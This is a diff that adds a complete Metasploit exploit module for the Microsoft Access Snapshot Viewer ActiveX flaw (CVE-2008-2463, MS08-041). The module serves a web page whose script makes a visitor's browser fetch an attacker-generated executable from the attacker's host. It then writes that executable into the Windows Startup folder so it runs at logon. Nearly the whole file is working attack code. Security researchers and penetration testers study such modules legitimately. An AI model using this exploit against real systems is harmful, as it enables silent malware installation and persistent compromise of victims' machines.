@@ -1,0 +1,104 @@
+##
+# $Id: ms08_041_snapshotviewer.rb 10394 2010-09-20 08:06:27Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+	include Msf::Exploit::EXE
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Snapshot Viewer for Microsoft Access ActiveX Control Arbitrary File Download',
+			'Description'    => %q{
+					This module allows remote attackers to place arbitrary files on a users file system
+				via the Microsoft Office Snapshot Viewer ActiveX Control.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         => [ 'MC' ],
+			'Version'        => '$Revision: 10394 $',
+			'References'     =>
+				[
+					[ 'CVE', '2008-2463' ],
+					[ 'OSVDB', '46749'],
+					[ 'MSB', 'MS08-041' ],
+					[ 'BID', '30114' ],
+				],
+			'Payload'        =>
+				{
+					'Space'           => 2048,
+					'StackAdjustment' => -3500,
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Automatic', { } ],
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Jul 07 2008'))
+
+		register_options(
+			[
+				OptString.new('PATH', [ true, 'The path to place the executable.', 'C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\']),
+			], self.class)
+	end
+
+	def autofilter
+		false
+	end
+
+	def check_dependencies
+		use_zlib
+	end
+
+	def on_request_uri(cli, request)
+
+		payload_url =  "http://"
+		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/payload"
+
+		if (request.uri.match(/payload/))
+			return if ((p = regenerate_payload(cli)) == nil)
+			data = generate_payload_exe({ :code => p.encoded })
+			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
+			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
+			return
+		end
+
+		vname  = rand_text_alpha(rand(100) + 1)
+		exe    = rand_text_alpha(rand(20) + 1)
+
+		content = %Q|
+		<html>
+		<head>
+			<script>
+			try {
+				var #{vname} = new ActiveXObject('snpvw.Snapshot Viewer Control.1');
+				#{vname}.SnapshotPath = "#{payload_url}";
+				#{vname}.CompressedPath = "#{datastore['PATH']}\\#{exe}.exe";
+				#{vname}.PrintSnapshot();
+			} catch( e ) { window.location = 'about:blank' ; }
+			</script>
+		</head>
+		</html>
+				|
+
+		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
+
+		send_response_html(cli, content)
+
+		handler(cli)
+
+	end
+
+end
